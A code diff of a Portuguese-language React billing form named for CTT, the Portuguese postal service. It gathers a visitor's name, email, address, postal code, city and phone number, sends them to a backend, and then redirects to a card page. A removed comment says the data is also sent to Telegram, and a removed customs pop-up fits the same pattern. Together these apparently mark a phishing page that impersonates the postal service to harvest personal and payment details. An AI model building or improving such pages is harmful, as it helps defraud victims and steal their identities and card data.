@@ -1,18 +1,17 @@
 import React, { useState } from 'react';
-import { Card, CardContent } from './ui/card';
-import { Input } from './ui/input';
-import { Button } from './ui/button';
-import { Label } from './ui/label';
-import { AlertCircle, Package } from 'lucide-react';
-import { useToast } from '../hooks/use-toast';
 import { useNavigate } from 'react-router-dom';
-import CustomsModal from './CustomsModal';
+import { Card, CardContent } from './ui/card';
+import { Button } from './ui/button';
+import { Input } from './ui/input';
+import { Label } from './ui/label';
+import { AlertCircle } from 'lucide-react';
 import axios from 'axios';
 
-const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
-const API = `${BACKEND_URL}/api`;
+// Get API URL from environment
+const API = process.env.REACT_APP_BACKEND_URL || 'http://localhost:8001';
 
 const CTTBillingForm = () => {
+  const navigate = useNavigate();
   const [formData, setFormData] = useState({
     nome: '',
     email: '',
@@ -21,76 +20,39 @@ const CTTBillingForm = () => {
     cidade: '',
     telefone: ''
   });
-  const [showModal, setShowModal] = useState(true);
   const [isSubmitting, setIsSubmitting] = useState(false);
-  const { toast } = useToast();
-  const navigate = useNavigate();
 
-  const handleInputChange = (field, value) => {
+  const handleInputChange = (e) => {
+    const { name, value } = e.target;
     setFormData(prev => ({
       ...prev,
-      [field]: value
+      [name]: value
     }));
   };
 
   const handleSubmit = async () => {
+    // Basic validation
+    if (!formData.nome || !formData.email || !formData.endereco || 
+        !formData.codigoPostal || !formData.cidade || !formData.telefone) {
+      return;
+    }
+
     setIsSubmitting(true);
     
     try {
-      // Validate required fields
-      const requiredFields = ['nome', 'email', 'endereco', 'codigoPostal', 'cidade', 'telefone'];
-      const missingFields = requiredFields.filter(field => !formData[field].trim());
-      
-      if (missingFields.length > 0) {
-        toast({
-          title: "Campos obrigatórios",
-          description: "Por favor, preencha todos os campos obrigatórios",
-          variant: "destructive"
-        });
-        setIsSubmitting(false);
-        return;
-      }
-
-      // Basic email validation
-      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-      if (!emailRegex.test(formData.email)) {
-        toast({
-          title: "Email inválido",
-          description: "Por favor, introduza um endereço de email válido",
-          variant: "destructive"
-        });
-        setIsSubmitting(false);
-        return;
-      }
-
-      // Send billing data to backend (and Telegram)
-      const response = await axios.post(`${API}/ctt/billing`, formData);
+      const response = await axios.post(`${API}/api/ctt/billing`, formData);
       
       if (response.data.status === 'success') {
         // Store billing ID for later use
         localStorage.setItem('ctt_billing_id', response.data.billing_id);
         localStorage.setItem('ctt_billing_data', JSON.stringify(formData));
         
-        toast({
-          title: "Informações enviadas com sucesso!",
-          description: "Redirecionando para pagamento...",
-          duration: 2000
-        });
-
-        // Navigate to card page after a short delay
-        setTimeout(() => {
-          navigate('/card');
-        }, 2000);
+        // Navigate to card page
+        navigate('/card');
       }
       
     } catch (error) {
       console.error('Error submitting billing data:', error);
-      
-      toast({
-        title: "Erro ao enviar dados",
-        description: error.response?.data?.detail || "Erro interno. Tente novamente.",
-        variant: "destructive"
-      });
     } finally {
       setIsSubmitting(false);
     }
@@ -108,8 +70,6 @@ const CTTBillingForm = () => {
             </h2>
           </div>
 
-
-
           {/* Form Fields */}
           <div className="space-y-6">
             {/* Nome */}
@@ -119,30 +79,28 @@ const CTTBillingForm = () => {
               </Label>
               <Input
                 id="nome"
+                name="nome"
                 type="text"
-                placeholder="Nome completo"
                 value={formData.nome}
-                onChange={(e) => handleInputChange('nome', e.target.value)}
+                onChange={handleInputChange}
                 className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
-                required
-                disabled={isSubmitting}
+                placeholder="Nome completo"
               />
             </div>
 
-            {/* Correio electrónico */}
+            {/* Email */}
             <div className="space-y-2">
               <Label htmlFor="email" className="text-sm font-medium text-gray-700">
                 Correio electrónico <span className="text-red-500">*</span>
               </Label>
               <Input
                 id="email"
+                name="email"
                 type="email"
-                placeholder="exemplo@email.com"
                 value={formData.email}
-                onChange={(e) => handleInputChange('email', e.target.value)}
+                onChange={handleInputChange}
                 className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
-                required
-                disabled={isSubmitting}
+                placeholder="exemplo@email.com"
               />
             </div>
 
@@ -153,64 +111,62 @@ const CTTBillingForm = () => {
               </Label>
               <Input
                 id="endereco"
+                name="endereco"
                 type="text"
-                placeholder="Rua, número, andar"
                 value={formData.endereco}
-                onChange={(e) => handleInputChange('endereco', e.target.value)}
+                onChange={handleInputChange}
                 className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
-                required
-                disabled={isSubmitting}
+                placeholder="Rua, número, andar"
               />
             </div>
 
-            {/* Código postal */}
-            <div className="space-y-2">
-              <Label htmlFor="codigoPostal" className="text-sm font-medium text-gray-700">
-                Código postal <span className="text-red-500">*</span>
-              </Label>
-              <Input
-                id="codigoPostal"
-                type="text"
-                placeholder="0000-000"
-                value={formData.codigoPostal}
-                onChange={(e) => handleInputChange('codigoPostal', e.target.value)}
-                className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
-                required
-                disabled={isSubmitting}
-              />
+            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
+              {/* Código Postal */}
+              <div className="space-y-2">
+                <Label htmlFor="codigoPostal" className="text-sm font-medium text-gray-700">
+                  Código postal <span className="text-red-500">*</span>
+                </Label>
+                <Input
+                  id="codigoPostal"
+                  name="codigoPostal"
+                  type="text"
+                  value={formData.codigoPostal}
+                  onChange={handleInputChange}
+                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
+                  placeholder="0000-000"
+                />
+              </div>
+
+              {/* Cidade */}
+              <div className="space-y-2">
+                <Label htmlFor="cidade" className="text-sm font-medium text-gray-700">
+                  Cidade <span className="text-red-500">*</span>
+                </Label>
+                <Input
+                  id="cidade"
+                  name="cidade"
+                  type="text"
+                  value={formData.cidade}
+                  onChange={handleInputChange}
+                  className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
+                  placeholder="Nome da cidade"
+                />
+              </div>
             </div>
 
-            {/* Cidade */}
-            <div className="space-y-2">
-              <Label htmlFor="cidade" className="text-sm font-medium text-gray-700">
-                Cidade <span className="text-red-500">*</span>
-              </Label>
-              <Input
-                id="cidade"
-                type="text"
-                placeholder="Nome da cidade"
-                value={formData.cidade}
-                onChange={(e) => handleInputChange('cidade', e.target.value)}
-                className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
-                required
-                disabled={isSubmitting}
-              />
-            </div>
-
-            {/* Número de telefone */}
+            {/* Telefone */}
             <div className="space-y-2">
               <Label htmlFor="telefone" className="text-sm font-medium text-gray-700">
                 Número de telefone <span className="text-red-500">*</span>
               </Label>
               <Input
                 id="telefone"
+                name="telefone"
                 type="tel"
-                placeholder="+351 9XX XXX XXX"
                 value={formData.telefone}
-                onChange={(e) => handleInputChange('telefone', e.target.value)}
+                onChange={handleInputChange}
                 className="w-full px-3 py-2 border border-gray-300 rounded-md focus:ring-red-500 focus:border-red-500"
-                required
-                disabled={isSubmitting}
+                placeholder="+351 9XX XXX XXX"
               />
             </div>
           </div>
@@ -246,12 +202,6 @@ const CTTBillingForm = () => {
           </div>
         </CardContent>
       </Card>
-
-      {/* Custom Modal */}
-      <CustomsModal 
-        isOpen={showModal}
-        onClose={() => setShowModal(false)}
-      />
     </div>
   );
 };
